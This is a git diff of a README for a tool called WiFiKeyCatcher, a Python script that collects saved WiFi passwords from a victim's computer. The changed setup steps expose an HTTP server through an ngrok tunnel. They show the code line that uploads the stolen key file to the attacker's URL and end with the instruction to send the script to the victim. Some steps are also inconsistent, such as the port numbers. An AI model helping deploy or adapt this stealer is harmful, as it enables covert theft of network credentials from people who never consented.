@@ -16,23 +16,28 @@
 ```
 $ git clone https://github.com/ibnaleem/WiFiKeyCatcher.git
 ```
-2. Run `ipconfig` in `cmd`
-3. Copy your `IPv4` address and open `main.py`
-4. Change `http://your-ip:9000`
-5. Save and open `cmd`:
+2. Run `HTTPServer`:
 ```
-$ py -m SimpleHTTPServer 9000
+$ py -m http.server
 ```
-6. Done, now wait for your target to open the script
+3. [Install ngrok](https://ngrok.com/download)
+4. Configure auth-token in terminal:
+```
+$ ngrok config add-authtoken <token>
+```
+5. Start tunnel on port 8000:
+```
+$ ngrok http 80
+```
+If successfull, you should see all of your system directories as embeded links.
 
-# Errors
-#### Python SimpleHTTPServer Error - No module named SimpleHTTPServer
+6, Copy ngrok URL and paste into `main.py` (line 52):
+```python
+url = "https://ngrok-url-here"
+files = {'file': open(f'{curr_path}.txt', 'rb')}
 ```
-$ py -m http.server 9000
-```
+
+Save and send to victim. Note: ngrok must be running to obtain WiFi-Keys
 
 #### Target Ran Script, Nothing Received
-Make sure your target has Python installed, and you're running HTTP server (step 5)
-
-# Security Issues
-1. Target has access to your machine IP due to line 52 requiring your IP to transfer files
+Make sure your target has Python installed, and you're running HTTP server + ngrok
